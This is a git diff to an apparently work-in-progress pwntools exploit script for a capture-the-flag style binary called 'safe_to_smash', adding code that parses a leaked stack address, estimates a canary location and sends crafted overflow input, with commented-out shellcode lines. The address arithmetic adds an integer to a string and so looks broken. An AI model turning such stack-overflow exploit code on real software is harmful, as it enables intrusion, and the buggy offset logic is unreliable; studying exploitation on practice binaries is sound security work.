@@ -3,6 +3,7 @@
 # This exploit template was generated via:
 # $ pwn template safe_to_smash
 from pwn import *
+import re
 
 # Set up pwntools for the correct architecture
 exe = context.binary = ELF('safe_to_smash')
@@ -26,6 +27,7 @@ def start(argv=[], *a, **kw):
 # ./exploit.py GDB
 gdbscript = '''
 break *0x{exe.symbols.main:x}
+break safe_to_smash.c:46
 continue
 '''.format(**locals())
 
@@ -44,7 +46,21 @@ continue
 # - one_gadget (github)
 
 io = start()
-
+leakline = io.recvline()
+leakline.find(' at ')
+m = re.search('at (0x[a-f0-9]+)', leakline)
+f1_addr = m.group(1)
+canary_addr = f1_addr + 40  # offset 40 observed with GDB
+msg = io.recvuntil("yes/no)?\n")
+print(msg)
+io.sendline("yes")
+msg = io.recvuntil("add?\n")
+print(msg)
+io.sendline('\x00' + '\xab'*100)
+msg = io.recvuntil("feature:\n")
+print(msg)
+io.sendline('100')
+#quit(0)
 # shellcode = asm(shellcraft.sh())
 # payload = fit({
 #     32: 0xdeadbeef,
